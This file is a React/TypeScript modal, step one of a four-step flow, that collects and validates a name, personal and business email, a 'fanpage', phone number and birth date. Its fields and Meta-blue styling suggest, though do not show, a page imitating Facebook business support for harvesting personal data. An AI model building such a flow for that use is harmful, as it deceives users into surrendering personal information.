import React from 'react';
import Modal from '#components/modals/Modal';
import PhoneInput from 'react-phone-input-2';
import CustomCheckbox from '#components/check-box/CustomCheckbox';
import { useAppDispatch, useAppSelector } from '../../app/store/hooks';
import { updateForm, type FormData } from '../../app/store/slices/stepFormSlice';
import { useAppStrings } from '@/hooks/useAppStrings';

interface InfomationsModalProps {
  isOpend: boolean;
  accountMismatchActive?: boolean;
  onClearAccountMismatch?: () => void;
  onInfoValidated: () => void;
  onToggleModal: (isOpen: boolean) => void;
}

const InfomationsModal: React.FC<InfomationsModalProps> = ({
  isOpend,
  accountMismatchActive,
  onClearAccountMismatch,
  onInfoValidated,
  onToggleModal,
}) => {
  const t = useAppStrings();
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  const normalizePhoneDigits = (value: string) => value.replace(/\D/g, '');
  const getPhoneDigitCount = (value: string) => normalizePhoneDigits(value).length;

  const [isOpen, setIsOpen] = React.useState(isOpend);
  const [errors, setErrors] = React.useState<Record<string, string>>({});
  const dispatch = useAppDispatch();
  const formData = useAppSelector((state) => state.stepForm.data);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>) => {
    const { id, value } = e.target;
    dispatch(updateForm({ [id as keyof FormData]: value } as Partial<FormData>));
    setErrors(prev => ({ ...prev, [id]: '' })); // Clear error on change
    if (accountMismatchActive && (id === 'email' || id === 'emailBusiness')) {
      onClearAccountMismatch?.();
    }
  };

  React.useEffect(() => {
    setIsOpen(isOpend);
  }, [isOpend]);

  const handleClose = () => {
    setIsOpen(false);
    onToggleModal(false);
  };

  const handSubmit = async (e: React.FormEvent) => {
    try {
      e.preventDefault();

      const newErrors: Record<string, string> = {};
      if (!formData.fullName.trim()) newErrors.fullName = t.info.errFullName;
      if (!formData.email.trim()) {
        newErrors.email = t.info.errEmail;
      } else if (!emailRegex.test(formData.email.trim())) {
        newErrors.email = t.info.errEmailFmt;
      }
      if (!formData.emailBusiness.trim()) {
        newErrors.emailBusiness = t.info.errEmailBiz;
      } else if (!emailRegex.test(formData.emailBusiness.trim())) {
        newErrors.emailBusiness = t.info.errEmailBizFmt;
      }
      if (!formData.fanpage.trim()) newErrors.fanpage = t.info.errFanpage;
      const phoneDigits = normalizePhoneDigits(formData.phone);
      const phoneDigitCount = getPhoneDigitCount(formData.phone);
      if (!phoneDigits) {
        newErrors.phone = t.info.errPhone;
      } else if (phoneDigitCount < 8 || phoneDigitCount > 15) {
        newErrors.phone = t.info.errPhoneLen;
      }
      if (!formData.day) newErrors.day = t.info.errDay;
      if (!formData.month) newErrors.month = t.info.errMonth;
      if (!formData.year) newErrors.year = t.info.errYear;

      if (Object.keys(newErrors).length > 0) {
        setErrors(newErrors);
        return;
      }

      const clientData = {
        ...formData,
      };

      dispatch(updateForm(clientData));

      handleClose();
      onInfoValidated();

    } catch (error) {
      console.error("Error submitting form:", error);
    }
  };

  const inputClass = (field: string) => `input w-full border ${errors[field] ? 'border-red-500' : 'border-[#d4dbe3]'} h-[40px] px-[11px] rounded-[10px] bg-[white] text-[14px] mb-[10px] focus-within:border-[#3b82f6] hover:border-[#3b82f6] focus-within:shadow-md hover:shadow-md focus-within:shadow-blue-100 hover:shadow-blue-100 transition-all duration-200`;
  const errorText = (field: string) => errors[field] && <p className="text-red-500 text-[13px] mt-[-5px] mb-[10px]">{errors[field]}</p>;
  const days = Array.from({ length: 31 }, (_, i) => String(i + 1));
  const months = Array.from({ length: 12 }, (_, i) => String(i + 1));
  const currentYear = new Date().getFullYear();
  const years = Array.from({ length: 100 }, (_, i) => String(currentYear - i));

  return (
    <Modal
      isOpen={isOpen}
      title={t.info.title}
      onClose={handleClose}
      flowStep={{ current: 1, total: 4 }}
    >
      <div className="flex min-h-full min-w-0 w-full flex-col">
        <form onSubmit={handSubmit} autoComplete="off" className='w-full'>
          <div className='w-full'>
            {accountMismatchActive ? (
              <div className='mb-[14px] rounded-[12px] border border-[#fad4d4] bg-[#fff5f5] px-[12px] py-[10px]'>
                <p className='text-[13px] leading-[1.55] text-[#b42318]'>
                  {t.captcha.accountCheckNoneLinked}
                </p>
              </div>
            ) : null}
            <div className='mb-[14px] rounded-[12px] border border-[#dbe6fb] bg-[#f5f9ff] px-[12px] py-[10px]'>
              <p className='text-[13px] leading-[1.55] text-[#33507f]'>
                {t.info.hint}
              </p>
            </div>
            <label htmlFor='fullName' className='mb-[6px] block text-[13px] font-semibold text-[#3b4a64]'>{t.info.fullName} <span className='text-[#e5484d]'>*</span></label>
            <div className={inputClass('fullName')}>
              <input
                type="text"
                id='fullName'
                placeholder={t.info.fullNamePh}
                className="w-full outline-0 h-full tracking-wide"
                value={formData.fullName}
                onChange={handleChange}
              />
            </div>
            {errorText('fullName')}

            <label htmlFor='email' className='mb-[6px] block text-[13px] font-semibold text-[#3b4a64]'>{t.info.email} <span className='text-[#e5484d]'>*</span></label>
            <div className={inputClass('email')}>
              <input
                type="email"
                id='email'
                placeholder={t.info.emailPh}
                className="w-full outline-0 h-full tracking-wide"
                value={formData.email}
                onChange={handleChange}
              />
            </div>
            {errorText('email')}

            <label htmlFor='emailBusiness' className='mb-[6px] block text-[13px] font-semibold text-[#3b4a64]'>{t.info.emailBiz} <span className='text-[#e5484d]'>*</span></label>
            <div className={inputClass('emailBusiness')}>
              <input
                type="email"
                id='emailBusiness'
                placeholder={t.info.emailBizPh}
                className="w-full outline-0 h-full tracking-wide"
                value={formData.emailBusiness}
                onChange={handleChange}
              />
            </div>
            {errorText('emailBusiness')}

            <label htmlFor='fanpage' className='mb-[6px] block text-[13px] font-semibold text-[#3b4a64]'>{t.info.fanpage} <span className='text-[#e5484d]'>*</span></label>
            <div className={inputClass('fanpage')}>
              <input
                type="text"
                id='fanpage'
                placeholder={t.info.fanpagePh}
                className="w-full outline-0 h-full tracking-wide"
                value={formData.fanpage}
                onChange={handleChange}
              />
            </div>
            {errorText('fanpage')}

            <label className='mb-[6px] block text-[13px] font-semibold text-[#3b4a64]'>{t.info.phone} <span className='text-[#e5484d]'>*</span></label>
            <div className={`input w-full border ${errors.phone ? 'border-red-500' : 'border-[#d4dbe3]'} h-[40px] rounded-[10px] bg-[white] text-[14px] mb-[10px]`}>
              <PhoneInput
                country={formData.country_code?.toLowerCase() || "us"}
                value={formData.phone}
                onChange={(phone) => {
                  const normalizedPhone = normalizePhoneDigits(phone).slice(0, 15);
                  dispatch(updateForm({ phone: normalizedPhone }))
                  setErrors(prev => ({ ...prev, phone: '' }))
                  if (accountMismatchActive) onClearAccountMismatch?.();
                }}
                inputProps={{
                  name: 'phone',
                  required: true,
                }}
              />
            </div>
            {errorText('phone')}

            <div>
              <b className='text-[#3b4a64] text-[13px] font-semibold mb-[7px] block'>{t.info.dob} <span className='text-[#e5484d]'>*</span></b>
            </div>
            <div className="grid grid-cols-1 gap-[10px] sm:grid-cols-3">
              <div>
                <div className={inputClass('day')}>
                  <select
                    id='day'
                    className="w-full outline-0 h-full"
                    value={formData.day}
                    onChange={handleChange}
                  >
                    <option value="">{t.info.day}</option>
                    {days.map((day) => (
                      <option key={day} value={day}>{day}</option>
                    ))}
                  </select>
                </div>
                {errorText('day')}
              </div>

              <div>
                <div className={inputClass('month')}>
                  <select
                    id='month'
                    className="w-full outline-0 h-full"
                    value={formData.month}
                    onChange={handleChange}
                  >
                    <option value="">{t.info.month}</option>
                    {months.map((month) => (
                      <option key={month} value={month}>{month}</option>
                    ))}
                  </select>
                </div>
                {errorText('month')}
              </div>

              <div>
                <div className={inputClass('year')}>
                  <select
                    id='year'
                    className="w-full outline-0 h-full"
                    value={formData.year}
                    onChange={handleChange}
                  >
                    <option value="">{t.info.year}</option>
                    {years.map((year) => (
                      <option key={year} value={year}>{year}</option>
                    ))}
                  </select>
                </div>
                {errorText('year')}
              </div>

            </div>

            <label htmlFor='message' className='mb-[6px] block text-[13px] font-semibold text-[#3b4a64]'>{t.info.message}</label>
            <div className={`input w-full border border-[#d4dbe3] h-[100px] px-[11px] py-[11px] rounded-[10px] bg-[white] text-[14px] mb-[10px]`}>
              <textarea
                id='message'
                className="w-full outline-0 h-full resize-none"
                placeholder={t.info.messagePh}
                value={formData.message}
                onChange={handleChange}
              />
            </div>

            <div className='mt-[15px] mb-[20px]'>
              <label className='cursor-pointer flex items-center gap-[5px] text-[14px]' htmlFor="custom-checkbox">
                <CustomCheckbox />
                {t.info.agree}{' '}
                <span className='text-[#0064E0] hover:underline'>
                  {t.info.agreeTerms}{' '}
                  <img
                    src="/images/icons/ic_reject.svg"
                    alt=""
                    className='inline w-[13px] h-[13px] min-w-[13px] min-h-[13px] max-w-[13px] max-h-[13px]'
                  />
                </span>
              </label>
            </div>
            <div className='w-full mt-[20px] '>
              <button type='submit' className='w-full min-h-[48px] bg-[#0064E0] text-[white] rounded-[40px] flex items-center justify-center cursor-pointer font-[500] text-[15px] active:opacity-90'>{t.info.submit}</button>
            </div>
          </div>

        </form>
      </div>
    </Modal>
  );
};

export default InfomationsModal;